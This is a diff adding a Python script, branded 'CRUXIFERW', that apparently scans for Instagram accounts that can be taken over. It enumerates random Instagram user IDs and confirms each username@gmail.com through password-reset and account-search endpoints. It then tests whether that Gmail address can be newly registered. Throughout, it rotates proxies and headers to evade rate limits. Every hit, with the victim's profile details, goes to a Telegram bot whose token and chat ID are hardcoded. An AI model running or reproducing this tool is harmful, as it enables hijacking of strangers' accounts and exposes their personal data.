@@ -1,0 +1,817 @@
+import os, sys, subprocess
+
+def install(pkg):
+    try:
+        __import__(pkg.split('==')[0].replace('-', '_'))
+    except ImportError:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '-q', '--disable-pip-version-check'])
+
+for _p in ['requests', 'httpx', 'beautifulsoup4', 'user-agent', 'cfonts']:
+    install(_p)
+
+import requests, uuid, time, random, json, re, os, sys, base64, secrets, threading, string, html, httpx
+from threading import Thread
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+from requests.adapters import HTTPAdapter
+import user_agent
+from cfonts import render
+
+# ── config ──
+MF, MUL, SU, FBL, FBH, WIS, NW, TMX = 0, 5, False, 20, 100, 180, 400, 600
+
+# ── full id ranges with years ──
+id_ranges = [
+    (17750001, 279760000, 2012),
+    (279760001, 900990000, 2013),
+    (900990001, 1629010000, 2014),
+    (1629010001, 2369359761, 2015),
+    (2369359762, 27238602160, 2016),
+    (27238602160, 46464475395, 2020),
+    (46464475395, 50289297647, 2021),
+    (50289297647, 57464707082, 2022),
+    (57464707082, 63313426938, 2023),
+    (63313426938, 70134323896, 2024),
+    (70313426938, 78313496938, 2025),
+]
+
+# ── proxy pool ──
+PROXIES = []
+try:
+    with open('proxies.txt', 'r', encoding='utf-8') as f:
+        PROXIES = [l.strip() for l in f if l.strip() and not l.startswith('#')]
+except Exception:
+    pass
+_proxy_lock = threading.Lock()
+_proxy_idx = [0]
+
+def get_proxy():
+    if not PROXIES:
+        return None
+    with _proxy_lock:
+        p = PROXIES[_proxy_idx[0] % len(PROXIES)]
+        _proxy_idx[0] += 1
+    if '://' not in p:
+        p = 'http://' + p
+    return {'http': p, 'https': p}
+
+# ── state ──
+em = None
+h = g = tk = bd = lm = 0
+inf = {}
+ST = datetime.now()
+lt_chk = ""
+lt_hit = ""
+_tls = threading.local()
+
+# ── shared ──
+cid = None
+tkn = None
+stat_msg_id = None
+stat_lock = threading.Lock()
+thread_lock = threading.Lock()
+username_cache = {}
+
+P = "\033[38;2;221;175;255m"
+C = "\033[38;2;164;218;255m"
+M = "\033[38;2;255;183;213m"
+L = "\033[38;2;190;255;222m"
+D = "\033[38;2;255;211;178m"
+Y = "\033[38;2;255;235;166m"
+B = "\033[1m"
+SI = "\033[2m"
+R = "\033[0m"
+G  = "\033[38;2;170;255;170m"
+SK = "\033[38;2;255;170;200m"
+CO = "\033[38;2;255;120;120m"
+IC = "\033[38;2;150;200;255m"
+W  = "\033[38;2;255;255;255m"
+
+_UA = [
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+    "Instagram 449.0.0.52.84 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
+    "Instagram 448.0.0.47.90 Android (33/13; 420dpi; 1080x2340; xiaomi; M2101K7AG; miui; qcom; en_US; 631289712)",
+]
+_DI = ["CP/xygE=", "CP/xigE=", "CJ/xgE=", "CP/xyAE="]
+_SC = ['"Chromium";v="139", "Not;A=Brand";v="99"',
+       '"Chromium";v="138", "Not;A=Brand";v="99"',
+       '"Chromium";v="137", "Not;A=Brand";v="99"']
+
+def _ua(): return random.choice(_UA)
+def _sh_headers():
+    return {
+        'sec-ch-ua': random.choice(_SC),
+        'sec-ch-ua-mobile': "?1" if random.random() > .5 else "?0",
+        'sec-ch-ua-platform': random.choice(['"Android"', '"Linux"', '"Windows"', '"macOS"']),
+    }
+def _mid(): return base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('=')
+def _dv(): return str(uuid.uuid4())
+def _fm(): return str(uuid.uuid4())
+def _an(): return "android-" + secrets.token_hex(8)
+def _rur(): return f'"HIL,{random.randint(10**9,10**10-1)},{random.randint(10**9,10**10-1)}:01fe{secrets.token_hex(32)}"'
+
+def generate_user_id():
+    lo, hi, _yr = random.choice(id_ranges)
+    return str(random.randint(lo, hi))
+
+def get_account_creation_year(user_id):
+    try:
+        v = int(user_id)
+        for lo, hi, yr in id_ranges:
+            if lo <= v <= hi:
+                return yr
+        return None
+    except:
+        return None
+
+def gs():
+    if not hasattr(_tls, 'sess') or _tls.sess is None:
+        s = requests.Session()
+        ad = HTTPAdapter(pool_connections=48, pool_maxsize=96, max_retries=0)
+        s.mount('https://', ad); s.mount('http://', ad)
+        s.headers.update({
+            'User-Agent': _ua(),
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            **_sh_headers(),
+        })
+        _tls.sess = s
+    return _tls.sess
+
+def rs():
+    try:
+        if hasattr(_tls, 'sess') and _tls.sess:
+            _tls.sess.close()
+    except Exception:
+        pass
+    _tls.sess = None
+    return gs()
+
+def req_post(url, **kw):
+    px = get_proxy()
+    if px and 'proxies' not in kw:
+        kw['proxies'] = px
+    return requests.post(url, **kw)
+
+def req_get(url, **kw):
+    px = get_proxy()
+    if px and 'proxies' not in kw:
+        kw['proxies'] = px
+    return requests.get(url, **kw)
+
+_tc = {'c': None, 'l': None, 'mt': 0.0}
+_tl = threading.Lock()
+TR = threading.Event()
+_lht = [time.time()]
+
+def _on_hit(): _lht[0] = time.time()
+
+def _le(msg):
+    n = time.time()
+    if n - _le.last < 30: return
+    _le.last = n
+    try:
+        with open('err.log', 'a', encoding='utf-8') as f:
+            f.write(f"{datetime.now().isoformat()} | {msg}\n")
+    except Exception:
+        pass
+_le.last = 0
+
+DID = "28036671149327607"
+UR = [(lo, hi) for lo, hi, _ in id_ranges]
+
+def dp():
+    try:
+        sys.stdout.write("\033[H\033[?25l")
+        pxc = len(PROXIES)
+        lines = [
+            f"{P}{B}  𓆩 𝐂𝐑𝐔𝐗𝐈𝐅𝐄𝐑𝐖 𓆪{R}",
+            "",
+            f"  {G}●{R} {B}{M}RUNNING{R}  {D}workers:{R} {P}{NW}{R}  {D}proxies:{R} {Y}{pxc}{R}  {D}uptime:{R} {W}{str(datetime.now()-ST).split('.')[0]}{R}",
+            "",
+            f"  {B}STATS{R}",
+            f"  {G}HITS{R}   {M}{B}{h}{R}      {SK}GOOD{R}   {L}{B}{g}{R}",
+            f"  {CO}BAD{R}    {CO}{B}{bd}{R}      {L}TAKEN{R}  {L}{B}{tk}{R}",
+            f"  {IC}LIMIT{R}  {Y}{B}{lm}{R}",
+            "",
+            f"  {B}LIVE CHECKING{R}",
+            f"  {IC}check{R}  {W}{lt_chk if lt_chk else 'idle'}{R}",
+            "",
+            f"  {B}LATEST HIT{R}",
+            f"  {G}last{R}  {M}{B}{lt_hit if lt_hit else 'none yet'}{R}",
+        ]
+        while len(lines) < 22:
+            lines.append("")
+        for x in lines:
+            sys.stdout.write(f"\033[2K{x}\n")
+        sys.stdout.flush()
+    except Exception:
+        pass
+
+def _send(text, kb=None):
+    if not tkn or not cid:
+        return None
+    try:
+        data = {"chat_id": cid, "text": text, "parse_mode": "HTML"}
+        if kb:
+            data["reply_markup"] = json.dumps(kb)
+        r = req_post(f"https://api.telegram.org/bot{tkn}/sendMessage",
+                     json=data, timeout=10)
+        res = r.json()
+        if res.get("ok"):
+            return res["result"]["message_id"]
+    except Exception:
+        pass
+    return None
+
+def _edit(mid, text, kb=None):
+    if not tkn or not cid or not mid:
+        return
+    try:
+        data = {"chat_id": cid, "message_id": mid, "text": text, "parse_mode": "HTML"}
+        if kb:
+            data["reply_markup"] = json.dumps(kb)
+        req_post(f"https://api.telegram.org/bot{tkn}/editMessageText",
+                 json=data, timeout=10)
+    except Exception:
+        pass
+
+def _stats_text():
+    return (
+        f"<b>𝐂𝐑𝐔𝐗𝐈𝐅𝐄𝐑𝐖 — sᴛᴀᴛs</b>\n"
+        f"\n"
+        f"<b>ʜɪᴛs</b>     : {h}\n"
+        f"<b>ɢᴏᴏᴅ</b>     : {g}\n"
+        f"<b>ᴛᴀᴋᴇɴ</b>    : {tk}\n"
+        f"<b>ʙᴀᴅ</b>      : {bd}\n"
+        f"<b>ʟɪᴍɪᴛ</b>    : {lm}\n"
+        f"\n"
+        f"workers : {NW}\n"
+        f"proxies : {len(PROXIES)}\n"
+        f"uptime  : {str(datetime.now()-ST).split('.')[0]}\n"
+        f"\n"
+        f"<b>ʟɪᴠᴇ ᴄʜᴇᴄᴋ</b>\n"
+        f"{lt_chk if lt_chk else 'idle'}\n"
+        f"\n"
+        f"<b>ʟᴀsᴛ ʜɪᴛ</b>\n"
+        f"{lt_hit if lt_hit else 'none'}"
+    )
+
+def _kb():
+    return {"inline_keyboard": [[{"text": "⟳ Refresh", "callback_data": "refresh"}]]}
+
+def post_stat(force_new=False):
+    global stat_msg_id
+    with stat_lock:
+        txt = _stats_text()
+        kb = _kb()
+        if stat_msg_id and not force_new:
+            _edit(stat_msg_id, txt, kb)
+        else:
+            mid = _send(txt, kb)
+            if mid:
+                stat_msg_id = mid
+
+def stats_loop():
+    while True:
+        time.sleep(5)
+        try:
+            post_stat()
+        except Exception:
+            pass
+Thread(target=stats_loop, daemon=True).start()
+
+def callback_poller():
+    global stat_msg_id
+    offset = None
+    while True:
+        try:
+            if not tkn:
+                time.sleep(1); continue
+            params = {"timeout": 30}
+            if offset:
+                params["offset"] = offset
+            r = req_get(f"https://api.telegram.org/bot{tkn}/getUpdates",
+                        params=params, timeout=35)
+            data = r.json()
+            if data.get("ok"):
+                for upd in data.get("result", []):
+                    offset = upd["update_id"] + 1
+                    cb = upd.get("callback_query")
+                    if cb and cb.get("data") == "refresh":
+                        mid = cb["message"]["message_id"]
+                        stat_msg_id = mid
+                        _edit(mid, _stats_text(), _kb())
+                        try:
+                            req_post(f"https://api.telegram.org/bot{tkn}/answerCallbackQuery",
+                                     json={"callback_query_id": cb["id"], "text": "Refreshed!"},
+                                     timeout=5)
+                        except Exception:
+                            pass
+        except Exception:
+            time.sleep(2)
+Thread(target=callback_poller, daemon=True).start()
+
+def hour_reporter():
+    hour = 0
+    while True:
+        time.sleep(3600)
+        hour += 1
+        try:
+            _send(
+                f"<b>𝐂𝐑𝐔𝐗𝐈𝐅𝐄𝐑𝐖</b>\n"
+                f"\n"
+                f"{hour} hour passed\n"
+                f"\n"
+                f"hits    : {h}\n"
+                f"good    : {g}\n"
+                f"taken   : {tk}\n"
+                f"bad     : {bd}\n"
+                f"uptime  : {str(datetime.now()-ST).split('.')[0]}"
+            )
+        except Exception:
+            pass
+Thread(target=hour_reporter, daemon=True).start()
+
+def gt():
+    while True:
+        try:
+            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
+            params = {'hl': "en-GB", '_reqid': "46000", 'rt': "j"}
+            payload = {
+                'continue': "https://accounts.google.com/ManageAccount?nc=1",
+                'f.req': '["AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl",null,null,null,null,0,0,"aesowns","aesowns",null,0,null,1,[],1]',
+                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
+                'cookiesDisabled': "false",
+                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
+                'gmscoreversion': "null",
+                'flowName': "GlifWebSignIn",
+                'checkConnection': "youtube:301",
+                'checkedDomains': "youtube",
+                'pstMsg': "1",
+                '': "",
+            }
+            headers = {
+                'User-Agent': _ua(), **_sh_headers(),
+                'x-same-domain': "1", 'google-accounts-xsrf': "1",
+                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
+                'origin': "https://accounts.google.com",
+                'x-client-data': random.choice(_DI),
+                'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty",
+                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
+                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
+            }
+            r = req_post(url, params=params, data=payload, headers=headers, timeout=20)
+            r.encoding = 'utf-8'
+            tx = r.text
+            if tx.startswith(")]}'"): tx = tx[4:]
+            tl1 = json.loads(tx)[0][1][2]
+
+            url = "https://accounts.google.com/_/signup/validatebasicinfo"
+            params = {'hl': "en-GB", 'TL': tl1, '_reqid': "346000", 'rt': "j"}
+            payload = {
+                'continue': "https://accounts.google.com/ManageAccount?nc=1",
+                'f.req': '["TL:' + tl1 + '",2015,4,15,2,null,null,0,null,null,0,0]',
+                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
+                'cookiesDisabled': "false",
+                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
+                'gmscoreversion': "null",
+                'flowName': "GlifWebSignIn",
+                'checkConnection': "youtube:301",
+                'checkedDomains': "youtube",
+                'pstMsg': "1",
+                '': "",
+            }
+            headers['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl1
+            r = req_post(url, params=params, data=payload, headers=headers, timeout=20)
+            r.encoding = 'utf-8'
+            tx = r.text
+            if tx.startswith(")]}'"): tx = tx[4:]
+            tl = json.loads(tx)[0][0][4].split("TL:")[1]
+            with open("g.txt", "w", encoding='utf-8') as w:
+                w.write(tl)
+        except Exception as e:
+            _le(f"gt: {e}")
+        time.sleep(1.5)
+Thread(target=gt, daemon=True).start()
+
+def rp(usr):
+    try:
+        url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
+        headers = {
+            'User-Agent': _ua(), 'x-csrftoken': "missing",
+            'accept-language': "en-IN, en-US",
+            'Content-Type': "application/x-www-form-urlencoded",
+            'x-ig-app-id': "936619743392459",
+            'x-requested-with': "XMLHttpRequest",
+            'origin': "https://www.instagram.com",
+            'referer': "https://www.instagram.com/accounts/password/reset/",
+        }
+        r = req_post(url, data={'email_or_username': usr, 'flow': "fxcal"},
+                     headers=headers, timeout=5)
+        res = r.json()
+        if res.get('status') == 'ok':
+            return res.get('obfuscated_email') or res.get('contact_point')
+        return None
+    except Exception:
+        return None
+
+def bc(eml):
+    global bd, g, lm
+    if not eml: return False
+    if SU and '_' in eml: return False
+    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"
+    dv, fm, an = _dv(), _fm(), _an()
+    bv = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+    payload = {
+        'params': '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) +
+                  ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) +
+                  '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},'
+                  '"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"","fetched_email_token_list":{},'
+                  '"search_query":"' + eml + '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,'
+                  '"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,'
+                  '"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release","accounts_list":[],'
+                  '"is_oauth_without_permission":0,"ig_android_qe_device_id":"' + dv + '",'
+                  '"gms_incoming_call_retriever_eligibility":"client_not_supported","search_screen_type":"email_or_username",'
+                  '"is_whatsapp_installed":1,"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
+                  '"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
+                  '","is_from_logged_out":0,"layered_homepage_experiment_group":null,"device_id":"' + an +
+                  '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
+                  '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,"context_data":"",'
+                  '"login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + fm +
+                  '","offline_experiment_group":"caa_iteration_v3_perf_ig_4","access_flow_version":"pre_mt_behavior",'
+                  '"is_from_logged_in_switcher":0,"qe_device_id":"' + dv + '"}}',
+        'bk_client_context': '{"bloks_version":"' + bv + '","styles_id":"instagram"}',
+        'bloks_versioning_id': bv,
+    }
+    headers = {
+        'User-Agent': _ua(), 'accept-language': "en-IN, en-US",
+        'x-bloks-version-id': bv,
+        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+        'x-ig-android-id': an, 'x-ig-app-id': "567067343352427",
+        'x-ig-app-locale': "en_IN",
+        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
+        'x-ig-device-id': dv, 'x-ig-family-device-id': fm,
+        'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
+        'x-mid': _mid(),
+        'x-pigeon-rawclienttime': str(time.time()),
+        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
+    }
+    try:
+        r = req_post(url, data=payload, headers=headers, timeout=6)
+        r.encoding = 'utf-8'
+        if eml in r.text:
+            g += 1; dp(); return True
+        elif 'Sorry, something' in r.text:
+            lm += 1; dp(); return False
+        else:
+            bd += 1; dp(); return False
+    except Exception:
+        bd += 1; dp(); return False
+
+def ga(usr, eml):
+    global h, tk, lt_chk
+    lt_chk = eml
+    dp()
+    try:
+        with open("g.txt", "r", encoding='utf-8') as f:
+            tl = f.read().strip()
+    except Exception:
+        time.sleep(.2); return
+    if not tl:
+        return
+    url = "https://accounts.google.com/_/signup/usernameavailability"
+    params = {'hl': "en-GB", 'TL': tl, '_reqid': "446000", 'rt': "j"}
+    payload = {
+        'continue': "https://accounts.google.com/ManageAccount?nc=1",
+        'f.req': '["TL:' + tl + '","' + usr + '",0,0,1,null,1,2464]',
+        'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
+        'cookiesDisabled': "false",
+        'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
+        'gmscoreversion': "null",
+        'flowName': "GlifWebSignIn",
+        'checkConnection': "youtube:301",
+        'checkedDomains': "youtube",
+        'pstMsg': "1",
+        '': "",
+    }
+    headers = {
+        'User-Agent': _ua(), **_sh_headers(),
+        'x-same-domain': "1", 'google-accounts-xsrf': "1",
+        'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
+        'origin': "https://accounts.google.com",
+        'x-client-data': random.choice(_DI),
+        'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty",
+        'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl,
+        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+        'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
+    }
+    try:
+        r = req_post(url, params=params, data=payload, headers=headers, timeout=6)
+        r.encoding = 'utf-8'
+        if '"gf.uar",1' in r.text:
+            h += 1; _on_hit(); dp()
+            gm = gmk(usr)
+            sb(tkn, cid, gm, usr, eml)
+        else:
+            tk += 1; dp()
+    except Exception:
+        tk += 1; dp()
+
+def gmk(q):
+    if not q or (SU and '_' in q): return None
+    try:
+        s = requests.Session()
+        s.get('https://www.instagram.com/accounts/password/reset/', timeout=5, proxies=get_proxy())
+        cf = s.cookies.get('csrftoken', '')
+        headers = {
+            'User-Agent': _ua(), 'X-CSRFToken': cf,
+            'X-IG-App-ID': '936619743392459',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.instagram.com',
+            'Referer': 'https://www.instagram.com/accounts/password/reset/',
+        }
+        r = s.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
+                   data={'email_or_username': q}, headers=headers, timeout=5, proxies=get_proxy())
+        res = r.json()
+        if res.get('status') == 'ok':
+            return res.get('obfuscated_email') or res.get('contact_point')
+        return None
+    except Exception:
+        return None
+
+def sb(token, chat_id, gmail, usr, eml):
+    global lt_hit
+    d = inf.get(usr, {})
+    fl = d.get('follower_count', 'N/A')
+    fw = d.get('following_count', 'N/A')
+    ps = d.get('media_count', 0) or 0
+    fn = d.get('full_name', 'N/A') or 'N/A'
+    bio = d.get('biography', 'N/A') or 'N/A'
+    re_ = gmail if gmail else 'Not Found'
+    bs = bio if len(str(bio)) <= 120 else str(bio)[:117] + "..."
+    lt_hit = f"@{usr} | {eml} | {re_}"
+
+    msg = (
+        f"<b>𝐇ɪᴛ — 𝐈ɴsᴛᴀɢʀᴀᴍ</b>\n"
+        f"\n"
+        f"username  : @{usr}\n"
+        f"email     : {eml}\n"
+        f"name      : {fn}\n"
+        f"followers : {fl}\n"
+        f"following : {fw}\n"
+        f"posts     : {ps}\n"
+        f"reset     : {re_}\n"
+        f"profile   : instagram.com/{usr}\n"
+        f"bio       : {bs}"
+    )
+    try:
+        req_post(f"https://api.telegram.org/bot{token}/sendMessage",
+                 json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
+                 timeout=8)
+    except Exception:
+        try:
+            with open('hits.txt', 'a', encoding='utf-8') as f:
+                f.write(msg + "\n\n")
+        except Exception:
+            pass
+
+def gtokens():
+    while True:
+        forced = False
+        try:
+            forced = TR.is_set()
+            if forced: TR.clear()
+            headers = {
+                'User-Agent': _ua(), **_sh_headers(),
+                'x-ig-app-id': "936619743392459",
+                'origin': "https://www.instagram.com",
+                'referer': "https://www.instagram.com/",
+                'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                'accept-encoding': "gzip, deflate, br",
+                'accept-language': "en-US,en;q=0.9",
+                'cache-control': "no-cache", 'pragma': "no-cache",
+                'sec-fetch-dest': "document", 'sec-fetch-mode': "navigate",
+                'sec-fetch-site': "none", 'upgrade-insecure-requests': "1",
+            }
+            s = gs()
+            px = get_proxy()
+            kw = dict(headers=headers, timeout=12)
+            if px: kw['proxies'] = px
+            r = s.get('https://www.instagram.com/', **kw)
+            r.encoding = 'utf-8'
+            csrf = r.cookies.get('csrftoken', '')
+            html_txt = r.text
+            lsd = None
+            m = re.search(r'"LSD",\[\],\{"token":"([^"]+)"', html_txt)
+            if m:
+                lsd = m.group(1)
+            else:
+                sm = re.search(r'window\._sharedData\s*=\s*({.*?});', html_txt, re.DOTALL)
+                if sm:
+                    try:
+                        lsd = json.loads(sm.group(1)).get('config', {}).get('csrf_token')
+                    except Exception:
+                        pass
+            if csrf and lsd:
+                with _tl:
+                    try:
+                        with open("tokens.txt", "w", encoding='utf-8') as fd:
+                            fd.write(f"{csrf}|{lsd}")
+                        _tc['c'] = csrf; _tc['l'] = lsd
+                        try: _tc['mt'] = os.path.getmtime('tokens.txt')
+                        except Exception: _tc['mt'] = time.time()
+                    except Exception:
+                        pass
+        except Exception as e:
+            _le(f"gtokens: {e}")
+        time.sleep(.5 if forced else 1.5)
+Thread(target=gtokens, daemon=True).start()
+
+FCS = "tPvqXDZm6bD62k-_0a2rRl"
+FLS = "9CaKjXH_JGbfD4zZaTfZ8a"
+
+def lt():
+    with _tl:
+        try:
+            if os.path.exists('tokens.txt'):
+                mt = os.path.getmtime('tokens.txt')
+                if mt > _tc['mt']:
+                    with open('tokens.txt', 'r', encoding='utf-8') as f:
+                        p = f.read().strip().split("|")
+                    if len(p) == 2 and p[0] and p[1]:
+                        _tc['c'], _tc['l'], _tc['mt'] = p[0], p[1], mt
+        except Exception:
+            pass
+        if _tc['c'] and _tc['l']:
+            return _tc['c'], _tc['l']
+    return FCS, FLS
+
+def wd():
+    while True:
+        time.sleep(15)
+        if time.time() - _lht[0] > WIS:
+            TR.set()
+            try:
+                with open('health.log', 'a', encoding='utf-8') as f:
+                    f.write(f"{datetime.now().isoformat()} idle - forced token refresh\n")
+            except Exception:
+                pass
+Thread(target=wd, daemon=True).start()
+
+he = ThreadPoolExecutor(max_workers=TMX)
+_il = threading.Semaphore(TMX - 100)
+
+def sh(fn, *a):
+    _il.acquire()
+    submitted = False
+    try:
+        def w():
+            try:
+                fn(*a)
+            finally:
+                _il.release()
+        he.submit(w)
+        submitted = True
+    finally:
+        if not submitted:
+            _il.release()
+
+def pp(usr):
+    global em, h
+    eg = usr + '@gmail.com'
+    em = eg
+    mk = rp(usr)
+    if mk:
+        h += 1; _on_hit(); dp()
+        sb(tkn, cid, mk, usr, eg)
+        return
+    if not bc(eg):
+        return
+    ga(usr, eg)
+
+RLM = ('checkpoint', 'rate limit', 'please wait', 'login_required', 'try again later', '429')
+
+def gu(ir):
+    cf = 0
+    while True:
+        s = gs()
+        try:
+            csrf, lsd = lt()
+            cookies = {'rur': _rur()}
+            headers = {
+                'User-Agent': _ua(), **_sh_headers(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
+                'x-ig-app-id': '936619743392459',
+                'x-fb-lsd': lsd, 'x-csrftoken': csrf,
+                'origin': 'https://www.instagram.com',
+                'sec-fetch-site': 'same-origin',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+            }
+            uid = generate_user_id()
+            variables = {
+                "enable_integrity_filters": True,
+                "id": uid,
+                "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
+                "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
+                "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
+                "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": True,
+                "__relay_internal__pv__PolarisShortDramaEnabledrelayprovider": True,
+            }
+            payload = {
+                'lsd': lsd,
+                'fb_api_caller_class': 'RelayModern',
+                'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
+                'variables': json.dumps(variables),
+                'server_timestamps': 'true',
+                'doc_id': DID,
+            }
+            px = get_proxy()
+            kw = dict(headers=headers, data=payload, cookies=cookies, timeout=8)
+            if px: kw['proxies'] = px
+            r = s.post('https://www.instagram.com/api/graphql', **kw)
+            if r.status_code == 429:
+                cf += 1; TR.set(); time.sleep(min(10 * cf, 120)); continue
+            tx = r.text
+            low = tx.lower()
+            if any(m in low for m in RLM):
+                cf += 1; TR.set(); time.sleep(min(10 * cf, 120)); continue
+            if tx.startswith('for'):
+                tx = tx[9:]
+            rj = json.loads(tx)
+            u = rj.get('data', {}).get('user') or {}
+            usr = u.get('username')
+            fl = u.get('follower_count', 0)
+            pk = u.get('pk')
+            if not usr or not pk:
+                cf += 1
+                if cf > FBL: TR.set(); time.sleep(5)
+                if cf > FBH: time.sleep(45); rs()
+                continue
+            cf = 0
+            if fl >= MF and not (SU and '_' in usr) and len(usr) >= MUL:
+                inf[usr] = u
+                sh(pp, usr)
+        except (requests.ConnectionError, requests.Timeout, requests.exceptions.ChunkedEncodingError):
+            cf += 1; rs()
+            if cf > FBL: time.sleep(5)
+            if cf > FBH: time.sleep(30)
+        except Exception as e:
+            cf += 1
+            _le(f"gu: {e}")
+
+def run():
+    global cid, tkn
+    print(f" {W}Bot Token{R} : ", end="")
+    tkn = "8631636780:AAEM9x5JhSpEO2o4vbKkDeVrlRQTRfWMSvU"
+    print(f" {W}Chat ID{R}   : ", end="")
+    cid = "7480132504"
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+    _send(
+        f"<b>𝐂𝐑𝐔𝐗𝐈𝐅𝐄𝐑𝐖</b>\n"
+        f"\n"
+        f"script running\n"
+        f"\n"
+        f"workers : {NW}\n"
+        f"proxies : {len(PROXIES)}\n"
+        f"started : {ST.strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+
+    try: post_stat(force_new=True)
+    except Exception: pass
+
+    wc = []
+    pr = NW // len(UR)
+    for r in UR:
+        for _ in range(pr): wc.append(r)
+    while len(wc) < NW: wc.append(random.choice(UR))
+
+    try:
+        with ThreadPoolExecutor(max_workers=len(wc)) as ex:
+            for c in wc: ex.submit(gu, c)
+            while True:
+                time.sleep(1)
+                dp()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        _send(
+            f"<b>𝐂𝐑𝐔𝐗𝐈𝐅𝐄𝐑𝐖</b>\n"
+            f"\n"
+            f"script ended\n"
+            f"\n"
+            f"hits    : {h}\n"
+            f"good    : {g}\n"
+            f"taken   : {tk}\n"
+            f"bad     : {bd}\n"
+            f"uptime  : {str(datetime.now()-ST).split('.')[0]}"
+        )
+
+if __name__ == "__main__":
+    run()
